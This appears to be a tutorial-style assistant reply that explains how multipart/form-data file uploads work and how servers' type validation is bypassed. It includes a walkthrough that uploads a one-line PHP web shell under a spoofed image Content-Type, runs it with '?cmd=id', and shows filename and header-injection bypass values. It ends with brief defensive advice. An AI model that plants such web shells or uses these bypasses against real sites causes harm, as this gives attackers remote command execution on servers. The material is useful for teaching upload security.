You've touched on a crucial piece of the puzzle. Understanding how `multipart/form-data` works is essential because **file upload vulnerabilities are often exploited by manipulating this exact structure**.

Let's break down what happens behind the scenes when you upload a file, and then I'll show you how attackers exploit the structure you just described.

## The Anatomy of a File Upload Request

When you upload a file, your browser doesn't just send the file data in a simple key-value pair. Instead, it constructs a specialized `multipart/form-data` request that looks like this:

```
POST /upload HTTP/1.1
Host: vulnerable-site.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 345678

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="csrf"

random-token-value-123
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="profile.jpg"
Content-Type: image/jpeg

ÿØÿàJFIF(...binary image data here...)
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Let's dissect what's happening here:

1. **Boundary strings** (`------WebKitFormBoundary...`) separate different parts of the form
2. **Content-Disposition** tells the server this is a file field named "avatar" with filename "profile.jpg"
3. **Content-Type** declares the MIME type of the file (`image/jpeg`)
4. **The actual binary data** follows a blank line

## Why This Structure Creates Vulnerabilities

The key insight is that **every piece of metadata in this request is controlled by the client**. The browser generates this based on the file you select, but an attacker with an intercepting proxy can modify every single field.

### The Three Pillars of File Type Validation (and How They Fail)

Servers typically try to validate file type using one or more of these approaches:

#### 1. Content-Type Header Validation
**How it works:** The server reads the `Content-Type: image/jpeg` field and trusts it.

**Why it fails:** As you noted, this is just a header sent by the browser. An attacker can change it to anything:

```
Content-Type: image/jpeg  →  Content-Type: application/x-php
```

If the server only checks this header, you've just tricked it into accepting a PHP file.

#### 2. Filename Extension Validation
**How it works:** The server extracts `filename="profile.jpg"` and checks the extension.

**Why it fails:** The filename field is equally controllable:

```
filename="profile.jpg"  →  filename="shell.php"
```

Some servers make the mistake of splitting the string and only checking the part after the last dot, leading to bypasses like `shell.php.jpg`.

#### 3. Magic Number Validation (The Robust One)
**How it works:** The server actually reads the first few bytes of the file content to verify it matches the claimed type.

**Why even this can fail:** As discussed earlier, polyglot files can satisfy both the magic number check *and* contain malicious code.

## The Attack in Practice

Let's walk through a real attack scenario against flawed file type validation:

**Step 1: Initial Reconnaissance**
You find an upload form that accepts profile pictures. You try uploading a simple `test.php` file containing `<?php phpinfo(); ?>`

**Response:** "Only image files are allowed."

**Step 2: Identify the Validation Mechanism**
You intercept the request for a legitimate JPG file and study it. Then you try modifying just the `Content-Type` header while keeping the file as a real JPG:

```
Original: Content-Type: image/jpeg
Modified: Content-Type: application/x-php
```

**Response:** File uploads successfully. This tells you the server is only checking the MIME type header, not the file contents.

**Step 3: Craft the Exploit**
Now you can upload your actual PHP web shell, but with the `Content-Type` header set to `image/jpeg`:

```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**Step 4: Execute**
You navigate to `https://vulnerable-site.com/uploads/webshell.php?cmd=id` and see the command output.

## Beyond Simple Header Manipulation

Attackers don't stop at just changing the `Content-Type`. More sophisticated techniques include:

### Boundary Injection
If the server doesn't properly parse multipart boundaries, attackers can inject additional form fields or even split the file payload.

### Filename Parameter Injection
Some servers parse the `filename` parameter naively, allowing injection of additional parameters:

```
filename="shell.php"\r\nContent-Type: application/x-php
```

If the parser isn't careful, this could inject an entirely new header.

### Charset Confusion
Adding charset information can sometimes bypass weak filters:

```
Content-Type: image/jpeg; charset=utf-8
```

## Why This Matters for Defense

Understanding this structure reveals why proper validation must happen *after* the request is parsed, not during. The server should:

1. **Parse the multipart structure correctly** using a well-tested library
2. **Extract the file content**, not just the headers
3. **Validate the actual content** using magic numbers
4. **Store the file with a server-generated name**, never trusting the provided filename

## The Attacker's Mindset Revisited

When you see a `multipart/form-data` upload form, think like an attacker:

- **"What does the server trust?"** Is it looking at headers, filenames, or content?
- **"What can I control?"** All of it—every header, every field, the entire structure.
- **"Where's the weakest link?"** Often, it's the developer's assumption that browsers will only send "good" data.

This is why file upload vulnerabilities remain so prevalent—developers build defenses based on trust in client-supplied metadata, not realizing that in HTTP, the client can be anyone with a proxy and a bit of curiosity.